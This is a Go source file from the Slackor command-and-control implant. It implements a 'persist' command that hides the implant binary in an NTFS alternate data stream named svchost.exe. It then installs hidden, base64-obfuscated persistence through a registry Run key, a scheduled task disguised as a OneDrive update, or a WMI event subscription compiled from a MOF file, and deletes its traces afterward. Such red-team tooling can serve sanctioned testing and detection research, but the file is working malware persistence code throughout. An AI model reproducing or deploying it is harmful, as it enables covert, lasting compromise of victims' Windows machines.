// +build windows

package windows

import (
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Persist pauses for N seconds
type Persist struct{}

// Name is the name of the command
func (p Persist) Name() string {
	return "persist"
}

// Run pauses for N seconds
func (p Persist) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("persist takes 1 argument")
	}
	mode := args[0]

	//Creates a bat file
	PERSIST, _ := os.Create("C:\\Users\\Public\\build.bat")
	//Creates a "Windows" folder in %APPDATA%
	PERSIST.WriteString("mkdir %APPDATA%\\Windows" + "\r\n")
	//Copies this binary into an alternate data stream
	wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c %APPDATA%\\Windows:svchost.exe\", 0, False"
	PERSIST.WriteString("echo " + wscript + " > %APPDATA%\\Windows:winrm.vbs \r\n")
	PERSIST.WriteString("type " + os.Args[0] + "> %APPDATA%\\Windows:svchost.exe \r\n")

	switch mode {
	case "registry":
		//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /t REG_SZ /F /D "wscript %APPDATA%\Windows:winrm.vbs"
		var RegAdd = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC90IFJFR19TWiAvRiAvRCAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMi"
		if checkForAdmin() { //If user is admin, store in HKLM instead
			//REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /t REG_SZ /F /D "wscript %APPDATA%\Windows:winrm.vbs"
			RegAdd = "UkVHIEFERCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC90IFJFR19TWiAvRiAvRCAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMi"
		}
		DecodedRegAdd, err := base64.StdEncoding.DecodeString(RegAdd)
		if err != nil {
			return "", err
		}
		//Add a registry key to execute the alternate datastream
		PERSIST.WriteString(string(DecodedRegAdd))
		PERSIST.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec.Run()
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
	case "scheduler":
		//schtasks /create /tn "OneDrive Standalone Update Task" /tr "wscript %APPDATA%\Windows:winrm.vbs" /sc DAILY
		var TaskAdd = "c2NodGFza3MgL2NyZWF0ZSAvdG4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC90ciAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMiIC9zYyBEQUlMWQ=="
		if checkForAdmin() {
			// schtasks /create /tn "OneDrive Standalone Update Task" /tr "wscript %APPDATA%\Windows:winrm.vbs" /sc ONSTART /ru system
			TaskAdd = "c2NodGFza3MgL2NyZWF0ZSAvdG4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC90ciAid3NjcmlwdCAlQVBQREFUQSVcV2luZG93czp3aW5ybS52YnMiIC9zYyBPTlNUQVJUIC9ydSBzeXN0ZW0="
		}
		DecodedTaskAdd, err := base64.StdEncoding.DecodeString(TaskAdd)
		if err != nil {
			return "", err
		}
		PERSIST.WriteString(string(DecodedTaskAdd))
		PERSIST.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec.Run()
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
	case "wmi":
		//MOF file
		var MOF = "I1BSQUdNQSBOQU1FU1BBQ0UgKCJcXFxcLlxccm9vdFxcc3Vic2NyaXB0aW9uIikKCmluc3RhbmNlIG9mIF9fRXZlbnRGaWx0ZXIgYXMgJEV2ZW50RmlsdGVyCnsKICAgTmFtZSA9ICJXaW5kb3dzIFVwZGF0ZSBFdmVudCI7CiAgIEV2ZW50TmFtZXNwYWNlID0gInJvb3RcXGNpbXYyIjsKICAgUXVlcnkgPSAiU0VMRUNUICogRlJPTSBfX0luc3RhbmNlTW9kaWZpY2F0aW9uRXZlbnQgV0lUSElOIDYwIFdIRVJFIFRhcmdldEluc3RhbmNlIElTQSAnV2luMzJfUGVyZkZvcm1hdHRlZERhdGFfUGVyZk9TX1N5c3RlbScgQU5EIFRhcmdldEluc3RhbmNlLlN5c3RlbVVwVGltZSA+PSAyMzAgQU5EIFRhcmdldEluc3RhbmNlLlN5c3RlbVVwVGltZSA8IDMzMCI7CiAgIFF1ZXJ5TGFuZ3VhZ2UgPSAiV1FMIjsKfTsKCmluc3RhbmNlIG9mIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciBhcyAkQ29uc3VtZXIKeyAgIAogICBOYW1lID0gIldpbmRvd3MgVXBkYXRlIENvbnN1bWVyIjsgICAKICAgUnVuSW50ZXJhY3RpdmVseSA9IGZhbHNlOyAgIAogICBDb21tYW5kTGluZVRlbXBsYXRlID0gIlBBVEgiOwp9OwoKaW5zdGFuY2Ugb2YgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZwp7CiAgIEZpbHRlciA9ICRFdmVudEZpbHRlcjsKICAgQ29uc3VtZXIgPSAkQ29uc3VtZXI7Cn07"
		DecodedMOF, err := base64.StdEncoding.DecodeString(MOF)
		if err != nil {
			return "", err
		}
		MOFile, err := os.Create("C:\\Users\\Public\\DtcInstall.txt")
		if err != nil {
			return "", err
		}
		env := os.Getenv("APPDATA") // Get APPDATA path
		env = strings.Replace(env, "\\", "\\\\", -1)
		MOFile.WriteString(strings.Replace(string(DecodedMOF), "PATH", "wscript "+env+"\\\\Windows:winrm.vbs", -1))
		MOFile.Close()
		PERSIST.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec.Run()
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
		Exec2 := exec.Command("cmd", "/C", "mofcomp C:\\Users\\Public\\DtcInstall.txt")
		Exec2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec2.Run()
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\DtcInstall.txt")
		if err != nil {
			return "", err
		}
	}

	return fmt.Sprintf("Attempted to persist implant using %s", mode), nil
}

func init() {
	command.RegisterCommand(Persist{})
}
